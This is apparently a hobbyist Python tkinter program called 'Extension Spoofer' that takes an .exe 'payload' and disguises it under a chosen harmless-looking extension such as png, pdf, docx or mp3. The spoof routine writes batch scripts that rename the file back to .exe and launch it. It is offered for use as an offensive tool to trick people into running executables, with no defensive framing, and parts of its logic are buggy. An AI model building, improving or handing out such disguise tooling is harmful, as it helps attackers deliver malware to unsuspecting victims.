# Extension Spoofer by vesper#0003
# follow my ig ' i_might_be_vesper ' or gay

import os
from tkinter import *
from tkinter import messagebox
from tkinter.filedialog import askopenfilename
from time import sleep

window = Tk()
window.title("Extension Spoofer || vesper#0003")
window.geometry("691x627")
window.maxsize(691, 627)
window.minsize(691, 627)
window.iconbitmap("assets/logo.ico")
window.config(background='#151414')

backg = PhotoImage(file="assets/background.png")
vesperisntgay = PhotoImage(file="assets/img0.png")
weewooweewoo = PhotoImage(file="assets/img1.png")
blankbu = PhotoImage(file="assets/blankbu.png")
fullbu = PhotoImage(file="assets/fullbu.png")

class ExtensionSpoofer:
    def __init__(self):
        self.zeext = ''
        self.png1 = False
        self.jpg1 = False
        self.txt1 = False
        self.docx1 = False
        self.pdf1 = False
        self.mp31 = False
        self.mp41 = False
        self.pptx1 = False
        self.main()
    def payload(self):
        filename = askopenfilename(filetypes=(("exe files","*.exe"),("All files","*.*")))
        self.payloadent.insert(END,filename)
    def lolpng(self):
        if self.png1 == False:
            self.png1 = False
            self.jpg1 = False
            self.txt1 = False
            self.docx1 = False
            self.pdf1 = False
            self.mp31 = False
            self.mp41 = False
            self.pptx1 = False
            self.jpg.config(image=blankbu)
            self.png.config(image=blankbu)
            self.txt.config(image=blankbu)
            self.docx.config(image=blankbu)
            self.pdf.config(image=blankbu)
            self.mp3.config(image=blankbu)
            self.mp4.config(image=blankbu)
            self.pptx.config(image=blankbu)
            self.png1 = True
            self.png.config(image=fullbu)
            self.zeext = 'png'
        else:
            self.zeext = ''
            self.png1 = False
            self.png.config(image=blankbu)
    def loljpg(self):
        if self.jpg1 == False:
            self.png1 = False
            self.jpg1 = False
            self.txt1 = False
            self.docx1 = False
            self.pdf1 = False
            self.mp31 = False
            self.mp41 = False
            self.pptx1 = False
            self.jpg.config(image=blankbu)
            self.png.config(image=blankbu)
            self.txt.config(image=blankbu)
            self.docx.config(image=blankbu)
            self.pdf.config(image=blankbu)
            self.mp3.config(image=blankbu)
            self.mp4.config(image=blankbu)
            self.pptx.config(image=blankbu)
            self.jpg1 = True
            self.jpg.config(image=fullbu)
            self.zeext = 'jpg'
        else:
            self.zeext = ''
            self.jpg1 = False
            self.jpg.config(image=blankbu)
    def loltxt(self):
        if self.txt1 == False:
            self.png1 = False
            self.jpg1 = False
            self.txt1 = False
            self.docx1 = False
            self.pdf1 = False
            self.mp31 = False
            self.mp41 = False
            self.pptx1 = False
            self.jpg.config(image=blankbu)
            self.png.config(image=blankbu)
            self.txt.config(image=blankbu)
            self.docx.config(image=blankbu)
            self.pdf.config(image=blankbu)
            self.mp3.config(image=blankbu)
            self.mp4.config(image=blankbu)
            self.pptx.config(image=blankbu)
            self.txt1 = True
            self.txt.config(image=fullbu)
            self.zeext = 'txt'
        else:
            self.zeext = ''
            self.txt1 = False
            self.txt.config(image=blankbu)
    def loldocx(self):
        if self.docx1 == False:
            self.png1 = False
            self.jpg1 = False
            self.txt1 = False
            self.docx1 = False
            self.pdf1 = False
            self.mp31 = False
            self.mp41 = False
            self.pptx1 = False
            self.jpg.config(image=blankbu)
            self.png.config(image=blankbu)
            self.txt.config(image=blankbu)
            self.docx.config(image=blankbu)
            self.pdf.config(image=blankbu)
            self.mp3.config(image=blankbu)
            self.mp4.config(image=blankbu)
            self.pptx.config(image=blankbu)
            self.docx1 = True
            self.docx.config(image=fullbu)
            self.zeext = 'docx'
        else:
            self.zeext = ''
            self.docx1 = False
            self.docx.config(image=blankbu)
    def lolpdf(self):
        if self.pdf1 == False:
            self.png1 = False
            self.jpg1 = False
            self.txt1 = False
            self.docx1 = False
            self.pdf1 = False
            self.mp31 = False
            self.mp41 = False
            self.pptx1 = False
            self.jpg.config(image=blankbu)
            self.png.config(image=blankbu)
            self.txt.config(image=blankbu)
            self.docx.config(image=blankbu)
            self.pdf.config(image=blankbu)
            self.mp3.config(image=blankbu)
            self.mp4.config(image=blankbu)
            self.pptx.config(image=blankbu)
            self.pdf1 = True
            self.pdf.config(image=fullbu)
            self.zeext = 'pdf'
        else:
            self.zeext = ''
            self.pdf.config(image=blankbu)
            self.pdf1 = False
    def lolmp3(self):
        if self.mp31 == False:
            self.png1 = False
            self.jpg1 = False
            self.txt1 = False
            self.docx1 = False
            self.pdf1 = False
            self.mp31 = False
            self.mp41 = False
            self.pptx1 = False
            self.jpg.config(image=blankbu)
            self.png.config(image=blankbu)
            self.txt.config(image=blankbu)
            self.docx.config(image=blankbu)
            self.pdf.config(image=blankbu)
            self.mp3.config(image=blankbu)
            self.mp4.config(image=blankbu)
            self.pptx.config(image=blankbu)
            self.zeext = 'mp3'
            self.mp31 = True
            self.mp3.config(image=fullbu)
        else:
            self.zeext = ''
            self.mp31 = False
            self.mp3.config(image=blankbu)
    def lolmp4(self):
        if self.mp41 == False:
            self.png1 = False
            self.jpg1 = False
            self.txt1 = False
            self.docx1 = False
            self.pdf1 = False
            self.mp31 = False
            self.mp41 = False
            self.pptx1 = False
            self.jpg.config(image=blankbu)
            self.png.config(image=blankbu)
            self.txt.config(image=blankbu)
            self.docx.config(image=blankbu)
            self.pdf.config(image=blankbu)
            self.mp3.config(image=blankbu)
            self.mp4.config(image=blankbu)
            self.pptx.config(image=blankbu)
            self.mp41 = True
            self.mp4.config(image=fullbu)
            self.zeext = 'mp4'
        else:
            self.mp41 = False
            self.mp4.config(image=blankbu)
            self.zeext = ''
    def lolpptx(self):
        if self.pptx1 == False:
            self.png1 = False
            self.jpg1 = False
            self.txt1 = False
            self.docx1 = False
            self.pdf1 = False
            self.mp31 = False
            self.mp41 = False
            self.pptx1 = False
            self.jpg.config(image=blankbu)
            self.png.config(image=blankbu)
            self.txt.config(image=blankbu)
            self.docx.config(image=blankbu)
            self.pdf.config(image=blankbu)
            self.mp3.config(image=blankbu)
            self.mp4.config(image=blankbu)
            self.pptx.config(image=blankbu)
            self.zeext = 'pptx'
            self.pptx1 = True
            self.pptx.config(image=fullbu)
        else:
            self.zeext = ''
            self.pptx.config(image=blankbu)
            self.pptx1 = False
    def spoof(self):
        payload = self.payloadent.get()
        ext = self.zeext
        m = payload.split('/')[-1]
        n = m.split('.')[0]
        n = n+'1'
        with open(payload, 'br') as f:
            content = f.read()
        with open(n+'.exe', 'bx') as f:
            f.write(content)
        sleep(2)
        with open("putimage.bat", "w+") as e:
            e.write(f"""
set Filename={n}
Ren "%Filename%.{ext}" "%Filename%.exe"

:start
if exist %Filename%.exe (start %Filename%.exe & Ren "%Filename%.exe" "%Filename%.{ext}") else (goto start)
     
            """)
        sleep(1)
        os.system("start putimage.bat")
        sleep(2)
        os.remove("putimage.bat")
        with open("Manual.bat", "w+") as y:
            y.write(f"""
set Filename={n}
Ren "%Filename%.{ext}" "%Filename%.exe"

:start
if exist %Filename%.exe (start %Filename%.exe & Ren "%Filename%.{ext}" "%Filename%.exe") else (goto start)
:end
ping localhost -n 5 >nul
if exist %Filename%.exe (start %Filename%.exe & Ren "%Filename%.exe" "%Filename%.{ext}")
            """)
        sleep(3)
        messagebox.showinfo('Extension Spoofer', f'Successfully Spoofed {m} To {n}.{ext}')
        self.__init__()
    def verify(self):
        payload  = self.payloadent.get()
        cool = False
        while True:
            if len(self.zeext) <= 0:
                messagebox.showerror('Extension Spoofer', 'Choose an Extension')
                break
            else:
                pass
            if len(payload) > 0 and payload.endswith('.exe') and os.path.exists(payload):
                pass
            else:
                messagebox.showerror('Extension Spoofer', 'Invalid Payload')
            cool = True
            break
        if cool == True:
            self.spoof()
    def main(self):
        madafaka = Label(window, image=backg, borderwidth=0)
        madafaka.place(x=0,y=0)
        self.payloadent = Entry(window,font=('SeoulHangang',10),bg='#8A8A8A', fg='#25629A',width=46,borderwidth=0)
        self.payloadent.place(x=111, y=282)
        monkeylol = Button(window, image=vesperisntgay,bg='#090B0E',borderwidth=0, activebackground="#090B0E",command=self.payload)
        monkeylol.place(x=455,y=278)
        self.png = Button(window, image=blankbu,bg='#090B0E',borderwidth=0, activebackground="#090B0E",command=self.lolpng)
        self.png.place(x=161,y=354)
        self.jpg = Button(window, image=blankbu,bg='#090B0E',borderwidth=0, activebackground="#090B0E",command=self.loljpg)
        self.jpg.place(x=161,y=420)
        self.txt = Button(window, image=blankbu,bg='#090B0E',borderwidth=0, activebackground="#090B0E",command=self.loltxt)
        self.txt.place(x=161,y=485)
        self.docx = Button(window, image=blankbu,bg='#090B0E',borderwidth=0, activebackground="#090B0E",command=self.loldocx)
        self.docx.place(x=333,y=354)
        self.pdf = Button(window, image=blankbu,bg='#090B0E',borderwidth=0, activebackground="#090B0E",command=self.lolpdf)
        self.pdf.place(x=333,y=420)
        self.mp3 = Button(window, image=blankbu,bg='#090B0E',borderwidth=0, activebackground="#090B0E",command=self.lolmp3)
        self.mp3.place(x=333,y=485)
        self.mp4 = Button(window, image=blankbu,bg='#090B0E',borderwidth=0, activebackground="#090B0E",command=self.lolmp4)
        self.mp4.place(x=501,y=354)
        self.pptx = Button(window, image=blankbu,bg='#090B0E',borderwidth=0, activebackground="#090B0E",command=self.lolpptx)
        self.pptx.place(x=501,y=420)
        builda = Button(window, image=weewooweewoo,bg='#090B0E',borderwidth=0, activebackground="#090B0E",command=self.verify)
        builda.place(x=433,y=465)

# hey shhh, its me vesper, yes me, the monkey guy, dont skid <3 ily
ExtensionSpoofer()
window.mainloop()